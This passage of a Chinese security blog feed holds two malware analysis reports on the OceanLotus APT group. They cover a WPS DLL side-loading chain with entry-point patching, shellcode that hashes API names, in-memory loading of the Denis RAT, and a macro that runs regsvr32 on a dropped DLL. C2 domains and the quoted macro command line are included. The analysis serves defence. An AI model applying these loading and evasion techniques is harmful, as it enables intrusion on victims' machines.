alt="image-20200319233917982"></p><p>查看正常白文件WPS的导入表，可如下图所示<code>Krpt.dll</code>正是其需要的导入模块。当受害者双击运行伪装成Word文件的WPS应用程序时，WPS主体进程便会加载恶意DLL文件<code>Krpt.dll</code>来执行其恶意代码。WPS的导入表如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200319235449212.png" alt="WPS的导入表"></p><h2 id="分析恶意dll"><a href="#分析恶意dll" class="headerlink" title="分析恶意dll"></a>分析恶意dll</h2><blockquote><p>经过分析，两个伪装成Word的文件都为WPS主体进程，是一样的。另外两个DLL文件基本上也都是一样的，主要区别在于存储在资源中的要释放并打开的Word文档不同（见动图“海莲花”），以及极个别shellcode中的几个字节不同。下面主要以一个DLL文件为主进行分析，将在两个DLL的不同处，进行说明。</p></blockquote><p>然后再查看恶意<code>krpt.dll</code>文件的导出表，发现其唯一的导出函数<code>?_force_link_krpt@@YGXXZ</code>正是WPS软件调用该模块的导入函数（可对照图[WPS表入表]中的导入函数），恶意krpt.dll的导出表，如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200314231101442.png" alt="图2"></p><p>当WPS调用该导出函数时，便会执行攻击者的恶意代码。不过在分析该导出函数<code>?_force_link_krpt@@YGXXZ</code>前，还发现其在dllmain中还有修改主程序入口点的操作。</p><p>由于WPS是VC++（2010）编译的，其入口前两条指令为call xxxx，jump xxxx。那么对应的第一个机器码便是==E8==（为修改其入口点，使其跳转到恶意代码中执行提供可能），正常的入口点代码如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315002835605.png" alt="image-20200315002835605"></p><p>当加载该恶意的krpt.dll之后，并运行其dllmain函数时，便会将WPS程序入口点偏移+1位置处的机器码修改为到达函数<code>?_force_link_krpt@@YGXXZ</code>的偏移，使WPS进程直接跳进该函数中执行恶意代码。修改WPS进程代码如图3：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315002040918.png" alt="图3"></p><p>修改后在WPS程序入口点，将直接跳转到函数<code>?_force_link_krpt@@YGXXZ</code>中去执行。修改后如图4：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315002707786.png" alt="图4"></p><h2 id="分析导出函数"><a href="#分析导出函数" class="headerlink" title="分析导出函数"></a>分析导出函数</h2><h3 id="释放docx文件"><a href="#释放docx文件" class="headerlink" title="释放docx文件"></a>释放docx文件</h3><p>首先从资源<strong>String Table</strong>中取出文件名字符串==湖南省家禽H5N1亚型高致病性禽流感疫情情况.docx（近期较为流行的话题）==，然后通过函数<code>ExpandEnvironmentStringW</code>获取临时目录，并将临时目录与文件名拼接起来，在通过函数<code>PathFileExistsW</code>来判断该文件是否存在。如图5：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315114441528.png" alt="图5"></p><p>资源<strong>String Table</strong>中的文件名字符串，如图6：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200320232232322.png" alt="图6"></p><p>当该文件不存在时，便从资源<strong>asdklfjghedjihasio</strong>的102中取出docx的二进制数据，并根据之前拼接出的路径==C:\Users\sam\AppData\Local\Temp\湖南省家禽H5N1亚型高致病性禽流感疫情情况.docx==，将资源中的docx数据写入该文件，如图7：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315120022373.png" alt="图7"></p><p>其中资源<strong>asdklfjghedjihasio</strong>中的102二进制数据，如图8：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315115703188.png" alt="图8"></p><p>写入完该docx文件，或是之前判断的该文件已存在时，便会通过函数<code>ShellExecuteW</code>来打开该docx文件。这么做的目的是为了==迷惑受害主机，运行WPS后能打开正常的docx文件。==如图9：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315120143982.png" alt="图9"></p><p>打开后的<strong>湖南省家禽H5N1亚型高致病性禽流感疫情情况.docx</strong>，如图10.1：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315120641622.png" alt="图10.1"></p><p>打开后的<strong>冠状病毒实时更新：中国正在追踪来自湖北的旅行者.doc</strong>，如图10.2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200320232439706.png" alt="image-20200320232439706"></p><h3 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h3><p>运行完docx后，将再从资源<strong>asdklfjghedjihasio</strong>的101中取出shellcode，然后调用<code>VirtualAlloc</code>开辟虚拟内存空间，将恶意代码写入并执行，如图11：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315123030822.png" alt="图11"></p><p>资源<strong>asdklfjghedjihasio</strong>的101中的shellcode，如图12.1：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315123340270.png" alt="图12.1"></p><p>两个DLL资源中的shellcode大体上也是一样的，两个dll资源中包含的shellcode二进制对比结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200317231041726.png" alt="图12.2"></p><h4 id="动态获取API"><a href="#动态获取API" class="headerlink" title="动态获取API"></a>动态获取API</h4><p>解密完之后，首先通过<code>fs</code>寄存器获取PEB，然后通过遍历PEB获取Kernel32.dll的模块基址（句柄），如图13：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315212941594.png" alt="image-20200315212941594"></p><p>获取到kernel32.dll模块的基址后，遍历导出表获取<strong>函数名称表、函数名称序号表、函数地址表</strong>，如图14：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315211118427.png" alt="图14"></p><p>然后计算遍历到的函数名的hash值，然后与预先算好的需要的函数的hash进行比较，当比较成功时，便获取该函数地址，如图15获取函数LoadLibrary：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315211736862.png" alt="图15"></p><h4 id="初始化数据"><a href="#初始化数据" class="headerlink" title="初始化数据"></a>初始化数据</h4><p>通过上面方法，获取了大量的<code>API</code>，然后在将经过处理的数据经过Switch分支进行重新拼接，需要经过Switch进行拼接处理的数据，如图16（其中标黄的为switch匹配的字符）：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315220444833.png" alt="图16"></p><p>经过Switch处理后的数据，其中比较重要的有C&amp;C:==libjs.inquirerjs.com==，Http通信方式==Get==，以及获取到的当前操作系统信息==/script/x.png?CN=WIN-S5OSAV0J2LE&amp;UN=sam&amp;C=Windows_NT==，如图17：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315221001121.png" alt="图17"></p><h4 id="与C-amp-C服务器通信获取指令执行"><a href="#与C-amp-C服务器通信获取指令执行" class="headerlink" title="与C&amp;C服务器通信获取指令执行"></a>与C&amp;C服务器通信获取指令执行</h4><p>重新处理完这些数据后，便开始尝试与C&amp;C服务器进行链接，将之前初始化的字符串数据发送到C&amp;C服务上，如图18：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315222558767.png" alt="图18"></p><p>并且不断重C&amp;C服务器接受数据，最终在执行获取到的数据。如图19：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200109204539863.png" alt="图19"></p><h4 id="内存中展开denis远控"><a href="#内存中展开denis远控" class="headerlink" title="内存中展开denis远控"></a>内存中展开denis远控</h4><p>然后上面这些网络通信获取指令执行的前提是Http会话打开成功，而krpt.dll这个恶意样本在WinHttpOpen时（见图18），传输的5个参数为全0，就导致打开会话失败，如图20：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315223353705.png" alt="图20"></p><p>推测该krpt.dll本意并不想产生网络数据（受害主机可能为隔离网环境），当WinHttpOpen失败时，便会加载准备好的denis远控，PE数据为数据段存储在shellcode中，并且直接在内存中将其按段展开，修复IAT重定位等，最终运行该==denis远控==程序。</p><p>shellcode函数表，先执行函数sub_17C下载执行shellcode，当失败时，便加载预先准备好的denis远控程序，如图21：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315224615351.png" alt="图21"></p><p>用同样遍历PEB的方式获取Kernel32的模块基址，来获取函数<code>LoadLibrary</code>和<code>GetProcAddress</code>，如图22：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315225044013.png" alt="image-20200315225044013"></p><p>然后在通过这两个函数来获取开辟内存相关的函数<code>VirualAlloc、RtlMoveMemory、RtlZeroMemory</code>，利用这些函数将denis远控软件各个区段展开，获取函数如图23：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315225302708.png" alt="图23"></p><p>先拷贝DOS头和NT头之后，再将节表中的数据按照区段一个一个来解密，再解密节表的同时，也将对应的区段数据进行解密，并拷贝至相应的偏移处，其中解密节表如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315225908774.png" alt="解密节表"></p><p>解密区段数据如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315225948344.png" alt="解密区段数据"></p><p>最终将区段拷贝至相应的偏移处，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315230032163.png" alt="image-20200315230032163"></p><p>最终通过函数<code>GetProcAddress</code>来 修复IAT表，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315230144540.png" alt="image-20200315230144540"></p><p>最终跳转到denis 远控的程序入口点执行远控，如图24：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315230359333.png" alt="图24"></p><h4 id="大量花指令的dnis远控"><a href="#大量花指令的dnis远控" class="headerlink" title="大量花指令的dnis远控"></a>大量花指令的dnis远控</h4><p>虽然该Shellcode是将各个区段的数据解密后，直接将其放入对应的<strong>VirtualAddress</strong>中的。但是笔者这里将每一段解密数据还原到<strong>RAW</strong>地址上。最终将完整为展开的<code>denis</code>远控dump了下来，不过经过分析，该denis中含有大量花指令，严重影响进一步分析，这里笔者就没有再继续分析下去了。<code>denis</code>远控从资源中去数据，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200320234727750.png" alt="image-20200320234727750"></p><p>调试<strong>denis Rat</strong>获取到的解密后的参数指令，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/11_%E6%B5%B7%E8%8E%B2%E8%8A%B102/image-20200315230735789.png" alt="image-20200315230735789"></p><h1 id="0x03-样本溯源"><a href="#0x03-样本溯源" class="headerlink" title="0x03 样本溯源"></a>0x03 样本溯源</h1><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>libjs.inquirerjs.com</td></tr></tbody></table><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>从上文的分析可以看出海莲花组织在白加黑利用技术、代码混淆等方面都有着很深的技术积累。后门木马不落地直接内存执行、签名程序白利用、shellcode隐藏可执行文件、多变的网络通信等技术手段大大增加了杀软的查杀难度。因此，我们提醒政府、企业等广大用户，切勿随意打开来历不明的文档，同时安装安全软件。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 宏病毒 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> APT </tag>
            
            <tag> 白利用 </tag>
            
            <tag> Gcow 追影小组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APT_海莲花分析报告01</title>
      <link href="2019/12/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/"/>
      <url>2019/12/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>海莲花分析报告</b></font></center><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center"><strong>样本名称</strong></th><th align="center">关于报送2019年度经营业绩考核目标建议材料的报告.doc</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>远控木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>2.51 MB (2,637,824 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>3c3b2cc9ff5d7030fb01496510ac75f2</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该样本通过宏，来调用regsvr32.exe加载并执行释放出来的恶意dll文件，执行该dll文件释放出docx并打开，来迷惑受害者。在该dll中还含有一段Shellcode，其作用是用来加载远控软件。比较有趣的是他首先会从指定域名jcdn.jsoid.com获取ShellCode来执行，当获取失败，便会加载原本自带的PE来执行。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/%E6%B5%B7%E8%8E%B2%E8%8A%B1.png" alt="海莲花"></p><h1 id="简单行为分析"><a href="#简单行为分析" class="headerlink" title="简单行为分析"></a>简单行为分析</h1><p>该样本是一个Word文件，文件内容显示的是360的Logo，并提示该文档是需要选种启用内容的，来诱导用户启用宏，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109192655742.png" alt="image-20200109192655742"></p><p>然后也可以用oledump查看一下宏的内容，发现在第8、9段数据中含有宏，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109122005200.png" alt="image-20200109122005200"></p><p>运行宏之后，在临时目录下释放了两个值得关注的文件，一个是<code>~$doc-ad9b812a-88b2-454c-989f-7bb5fe98717e.ole</code>，另一个文件为<code>File-aff94b08-6d9f-48c5-9900-5bee8ef5ab33.docx</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109144400958.png" alt="image-20200109144400958"></p><p>运行宏之后，宏首先调用了<code>regsvr32.exe</code>执行了释放出来的.ole文件，然后迅速结束自身，并重新以一样的参数再次启动一次<code>regsvr32.exe</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109144857199.png" alt="image-20200109144857199"></p><p>在再次执行<code>regsvr32.exe</code>的同时，调用Word打开释放出的.docx文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109145106519.png" alt="image-20200109145106519"></p><p>运行宏样本之后，通过调用<code>regsvr32.exe</code>不断与多个黑IP，发送TCP请求，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109145544881.png" alt="image-20200109145544881"></p><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="宏代码"><a href="#宏代码" class="headerlink" title="宏代码"></a>宏代码</h2><p>Alt+F11编辑宏代码，查看主要执行逻辑函数<code>Auto_Open()</code>，其中有明显的执行指令<code>Shell</code>，直接下断点调试查看执行的参数，执行参数为：<code>&quot;regsvr32.exe &quot;C:\Users\john\AppData\Local\Temp\~$doc-ad9b812a-88b2-454c-989f-7bb5fe98717e.ole&quot;&quot;</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109193459300.png" alt="image-20200109193459300"></p><p>之前的宏代码，都是用来释放该要执行的<code>.ole</code>文件的。找到该文件查看文件属性，发现该文件是一个伪装成ole文件的dll文件。并通过<code>regsvr32.exe</code>默认执行该dll文件的导出函数<code>DllRegisterServer</code> ，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109194227269.png" alt="image-20200109194227269"></p><h2 id="释放docx并执行shellcode"><a href="#释放docx并执行shellcode" class="headerlink" title="释放docx并执行shellcode"></a>释放docx并执行shellcode</h2><p>然后分析该释放出来的dll文件的导出函数<code>DllRegisterServer</code> 。</p><p>首先先检测环境变量==N92KG7KSpA21lGd2OPZA==（感染标记）是否存在。若不存在，便将该值设置为环境变量，并重新以相同参数运行自身进程（如：抓取行为时的迅速结束自身并重新启动）。然后当成功获取到该环境变量后，便会执行函数<code>WriteDocx</code>写入docx的操作，并返回从资源中解密出来的<code>ShellCode</code>的起始地址给<code>V3</code>，然后在执行该ShellCode，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109195223580.png" alt="image-20200109195223580"></p><p><strong>释放docx</strong></p><p>函数<code>WriteDocx</code>，往临时目录下写入docx文件并打开，来伪装通过宏打开了一个正常的docx文件，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109195511638.png" alt="image-20200109195511638"></p><p><strong>分析ShellCode</strong></p><p>该ShellCode内容还是比较多的，其中比较有趣的是，该ShellCode会先尝试与C2服务器==jcdn.jsoid.com==进行链接，来获取数据（ShellCode）来执行，如下两图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109204314612.png" alt="image-20200109204314612"></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109204539863.png" alt="image-20200109204539863"></p><p>当从C2服务器获取数据失败时，便会加载原先设定好的RAT，将其展开后解密执行，代码如图：</p><p><strong>展开并解密PE：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109204833541.png" alt="image-20200109204833541"></p><p>跳转到展开后的PE中去执行：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109204859782.png" alt="image-20200109204859782"></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/10_%E6%B5%B7%E8%8E%B2%E8%8A%B101/image-20200109205437150.png" alt="image-20200109205437150"></p><p>简单看了一下加载的PE文件，代码量也挺大的并且也比较的复杂，这里就没有继续跟下去了。</p><h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>jcdn.jsoid.com</td></tr><tr><td>clip.shangweidesign.com</td></tr><tr><td>77.245.76.66</td></tr><tr><td>77.245.76.66</td></tr></tbody></table><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>该样本通过Word内嵌宏来进行传播，并诱导用户打开宏文件来实施攻击。其调用白程序regsvr32.exe加载释放出的dll文件，在一定程度上的隐蔽自身，并最终通过执行shellcode来执行恶意行为。因此在查看未知来源并且带有宏的文件时，应该多加小心，在确认其来源之后，并十分确认没有问题时，再进行查看。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 宏病毒 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> APT </tag>
            
            <tag> 白利用 </tag>
            
            <tag> Gcow 追影小组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GandCrab V5.2解密工具</title>
      <link href="2019/11/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrab%20V5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/"/>
      <url>2019/11/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrab%20V5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</url>
      
